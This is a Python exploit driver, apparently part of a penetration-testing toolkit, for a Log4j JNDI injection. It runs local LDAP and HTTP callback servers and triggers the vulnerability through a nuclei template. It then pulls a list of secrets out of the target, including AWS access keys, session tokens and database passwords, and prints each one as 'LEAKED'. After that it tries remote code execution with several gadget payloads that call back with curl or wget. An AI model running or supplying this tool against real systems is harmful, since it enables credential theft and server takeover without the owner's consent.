#!/user/bin/python3

import sys
import os
import json
import secrets
import subprocess   # noqa: S404
import queue
import time
import proc_util

from argparse import ArgumentParser


ENV_VARS = [
    'env:AWS_ACCESS_KEY_ID',
    'env:AWS_CONFIG_FILE',
    'env:AWS_PROFILE',
    'env:AWS_SECRET_ACCESS_KEY',
	'env:AWS_ACCESS_KEY',
    'env:AWS_SECRET_KEY',
    'env:AWS_SESSION_TOKEN',
    'env:AWS_SHARED_CREDENTIALS_FILE',
    'env:AWS_WEB_IDENTITY_TOKEN_FILE',
    'env:HOSTNAME',
    'env:MYSQL_USER',
    'env:MYSQL_PASSWORD',
	'env:DB_HOST',
    'env:DB_PORT',
    'env:DB_USER',
    'env:DB_USERNAME',
    'env:DB_PASSWD',
    'env:DB_PASSWORD',
    'env:DB_NAME',
    'env:DB_PASS',
    'env:JAVA_VERSION',
    'env:PATH',
    'env:USER',
	'env:USERNAME',
    'env:USERDOMAIN',
    'hostName',
    'java.vendor',
    'java:os',
    'java:version',
    'log4j:configParentLocation',
    'sys:PROJECT_HOME',
    'java:runtime',
    'sys:file.separator',
    'sys:java.class.path',
    'sys:java.class.path',
    'sys:java.class.version',
    'sys:java.compiler',
    'sys:java.ext.dirs',
    'sys:java.home',
    'sys:java.io.tmpdir',
    'sys:java.library.path',
    'sys:java.specification.name',
    'sys:java.specification.vendor',
    'sys:java.specification.version',
    'sys:java.vendor.url',
    'sys:java.vendor',
    'sys:java.version',
    'sys:java.vm.name',
    'sys:java.vm.specification.name',
    'sys:java.vm.specification.vendor',
    'sys:java.vm.specification.version',
    'sys:java.vm.vendor',
    'sys:java.vm.version',
    'sys:line.separator',
    'sys:os.arch',
    'sys:os.name',
    'sys:os.version',
    'sys:path.separator',
    'sys:user.dir',
    'sys:user.home',
    'sys:user.name',
    'env:PSModulePath',
    'env:JDBC_URL',
	
]

PAYLOAD_TYPES = ['tomcat', 'ref', 'beanutils', 'groovy', 'rhino3', 'java']
RCE_COMMAND_MAP = {
    'tomcat': ['curl', 'wget', 'ps'],
    'ref': ['curl', 'wget', 'ps'],
    'beanutils': ['curl', 'wget', 'ps'],
    'groovy': ['curl', 'wget', 'ps'],
    'rhino3': ['curl', 'wget', 'ps'],
    'java': ['url']
}

LDAP_SERVER_TYPE = 'LDAP'
HTTP_SERVER_TYPE = 'HTTP'
NUCLEI_TYPE = 'NUCLEI'


def _parse_args():
    parser = ArgumentParser()
    parser.add_argument('url', help='target URL')
    parser.add_argument('template', help='Path to nuclei template file that triggers vulnerability')
    parser.add_argument('-i', '--ip', required=False, help='local IP for LDAP/HTTP servers to bind to', default='0.0.0.0')  # noqa: S104
    parser.add_argument('--ldap_port', required=False, help='local port that LDAP server listens on', type=int, default=1389)
    parser.add_argument('--ldap_jar_path', required=False, help='path to LDAP server jar', default='/opt/h3/jndi_server.jar')
    parser.add_argument('--http_port', required=False, help='local port that HTTP server listens on', type=int, default=8000)
    parser.add_argument('--nuclei_path', required=False, help='path to nuclei binary', default='/opt/h3/nuclei')
    parser.add_argument('--http_server_path', required=False, help='path to http_server.py', default='http_server.py')
    parser.add_argument('-v', '--verbose', help="Print debugging information", action="store_true")
    parser.add_argument('-p', '--payload_type', help="One of: tomcat, ref, beanutils, groovy, rhino3, java. Default is to try all.", choices=PAYLOAD_TYPES, default=None)
    parser.add_argument('-o', '--output_file', help='Name of JSON output file', required=False)

    return parser.parse_args()


def _validate_args(nuclei_template_path, nuclei_path, ldap_jar_path, http_server_path):
    for path in [nuclei_template_path, nuclei_path, ldap_jar_path, http_server_path]:
        if not os.path.isfile(path):
            sys.stderr.write(f'File does not exist: {path}\n')
            sys.exit(1)


def _trigger_vuln(nuclei_path, target_url, nuclei_template_path, base_path, ldap_ip_port, env_var, verbose):
    nuclei_proc = subprocess.Popen([
        nuclei_path,
        '-u', target_url,
        '-t', nuclei_template_path,
        '-silent',
        '--var', f'base-path={base_path}',
        '--var', f'ldap-ip-port={ldap_ip_port}',
        '--var', f'env-var={env_var}',
        '-timeout', '30'
    ])

    try:
        nuclei_proc.wait(31)
    except Exception:
        proc_util.kill_proc(nuclei_proc, NUCLEI_TYPE)


def main():
    args = _parse_args()

    target_url = args.url
    nuclei_template_path = args.template
    ip = args.ip
    ldap_port = args.ldap_port
    ldap_jar_path = args.ldap_jar_path
    http_port = args.http_port
    nuclei_path = args.nuclei_path
    http_server_path = args.http_server_path
    verbose = args.verbose
    output_file = args.output_file

    if args.payload_type is not None:
        payload_types = [args.payload_type]
    else:
        payload_types = PAYLOAD_TYPES

    _validate_args(nuclei_template_path, nuclei_path, ldap_jar_path, http_server_path)

    token = secrets.token_hex(16)
    if verbose:
        print(f'Using token {token}')

    # used for IPC between this process and LDAP/HTTP server procs
    output_queue = queue.Queue()

    http_payload_dir = f"./{secrets.token_hex(8)}"
    os.mkdir(http_payload_dir)
    if verbose:
        print(f'Created payload dir {http_payload_dir}')

    # start LDAP server
    ldap_server_args = ['java', '-jar', ldap_jar_path, '-i', ip, '-lport', str(ldap_port), '-hport', str(http_port), '-hdir', http_payload_dir, '-t', token]

    ldap_svr_proc = proc_util.start_server(ldap_server_args, output_queue, LDAP_SERVER_TYPE)
    if not ldap_svr_proc:
        sys.stderr.write('Error starting LDAP server, aborting\n')
        sys.exit(1)

    # start HTTP server
    http_server_args = ['python3', '-u', http_server_path, '-i', ip, '-p', str(http_port), '-d', http_payload_dir, '-t', token]

    http_svr_proc = proc_util.start_server(http_server_args, output_queue, HTTP_SERVER_TYPE)
    if not http_svr_proc:
        sys.stderr.write('Error starting HTTP server, aborting\n')

        proc_util.kill_proc(ldap_svr_proc, LDAP_SERVER_TYPE)
        sys.exit(1)

    try:
        ldap_ip_port = f'{ip}:{ldap_port}'

        # verify vulnerability
        ldap_msgs = []
        print('Verifying vuln...')
        for _ in range(0, 3):
            if verbose:
                print('Triggering vuln with hostName variable')

            _trigger_vuln(nuclei_path, target_url, nuclei_template_path, f'{token}-env', ldap_ip_port, 'hostName', verbose)

            is_vulnerable_proof = proc_util.check_for_msg_type(output_queue, LDAP_SERVER_TYPE, 'env', 30)
            if is_vulnerable_proof:
                ldap_msgs.append(is_vulnerable_proof)
                break

        if ldap_msgs:
            print('Server is vulnerable!')
        else:
            print('Failed to exploit')
            sys.exit(0)

        # test all env variables now
        print('Gathering environment info...')
        for e in ENV_VARS:
            if verbose:
                print(f'Triggering vuln with {e} variable')
            _trigger_vuln(nuclei_path, target_url, nuclei_template_path, f'{token}-env', ldap_ip_port, e, verbose)
            time.sleep(1)

        # now gather all messages
        ldap_msgs = ldap_msgs + proc_util.gather_msgs(output_queue, LDAP_SERVER_TYPE, 'env', 30)
        for m in ldap_msgs:
            # unresolved env vars will still be ${var_name}
            if not m.get('value', '${').startswith('${'):
                print(f"LEAKED {m.get('var')}={m.get('value')}")
            elif verbose:
                print(f"No value returned for {m.get('var')}")

        # Check for RCE now
        http_msgs = []
        for payload_type in payload_types:
            for cmd_type in RCE_COMMAND_MAP[payload_type]:
                if verbose:
                    print(f'Attempting RCE with {payload_type} payload and {cmd_type} command')
                _trigger_vuln(nuclei_path, target_url, nuclei_template_path, f'{token}-payload-{payload_type}-{cmd_type}', ldap_ip_port, 'hostName', verbose)
                time.sleep(1)

            http_msgs = http_msgs + proc_util.gather_msgs(output_queue, HTTP_SERVER_TYPE, 'ping', 30)
            if http_msgs:
                for m in http_msgs:
                    print(f'Got RCE with {payload_type} payload: {m}')
                break

        if not http_msgs:
            print('Failed to get proof of RCE')

        if output_file:
            with open(output_file, 'w') as f:
                json.dump({'ldap': ldap_msgs, 'http': http_msgs}, f, indent=4)
            if verbose:
                print(f'Wrote messages to {output_file}')

    except Exception as e:
        sys.stderr.write(f'Unexpected error {e}\n')
        sys.exit(1)

    finally:
 
        proc_util.kill_proc(ldap_svr_proc, LDAP_SERVER_TYPE)
        proc_util.kill_proc(http_svr_proc, HTTP_SERVER_TYPE)

if __name__ == "__main__":
    main()
